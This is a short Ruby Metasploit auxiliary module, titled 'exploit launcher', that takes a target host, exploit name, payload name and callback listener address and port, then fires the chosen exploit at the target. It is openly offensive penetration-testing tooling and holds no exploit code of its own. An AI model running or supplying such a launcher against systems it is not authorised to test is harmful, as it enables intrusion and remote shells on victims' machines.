#!/usr/bin/env ruby

class MetasploitModule < Msf::Auxiliary

  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner

    def initialize(info = {})
        super(update_info(info,
        'Name'     => 'exploit launcher',
        'Description' => %q{
            This module facilitates automated deployment of exploit modules
            with configurable payload options against specified targets.
        },
        'Author'   => [ 'Anomaliszt' ],
        'License'  => MSF_LICENSE))

        register_options(
            [
                OptString.new('RHOST', [true, 'Remote target host address']),
                OptString.new('EXPLOIT', [true, 'Exploitation module identifier']),
                OptString.new('PAYLOAD', [true, 'Shellcode payload identifier']),
                OptString.new('LHOST', [true, 'Callback listener address']),
                OptInt.new('LPORT', [true, 'Callback listener port'])
            ]
        )
    end
      
    def run
        rhost = datastore['RHOST']
        exploit_name = datastore['EXPLOIT']
        payload_name = datastore['PAYLOAD']
        lhost = datastore['LHOST']
        lport = datastore['LPORT']

        print_status("Deploying exploit #{exploit_name} against target #{rhost} using payload #{payload_name}")

        exploit = framework.exploits.create(exploit_name)

        if exploit.nil?
            print_error("Unable to locate exploit module: #{exploit_name}")
            return
        end

        exploit.datastore['RHOST'] = rhost
        exploit.datastore['LHOST'] = lhost
        exploit.datastore['LPORT'] = lport
        exploit.datastore['PAYLOAD'] = payload_name

        payload = framework.payloads.create(payload_name)
        if payload.nil?
            print_error("Payload module unavailable: #{payload_name}")
            return
        end

        payload.datastore['LHOST'] = lhost
        payload.datastore['LPORT'] = lport

        print_status("Initiating exploitation sequence")

        exploit.exploit_simple(
            'Payload'       => payload,
            'TargetHost'    => rhost
        )
        
    end
end
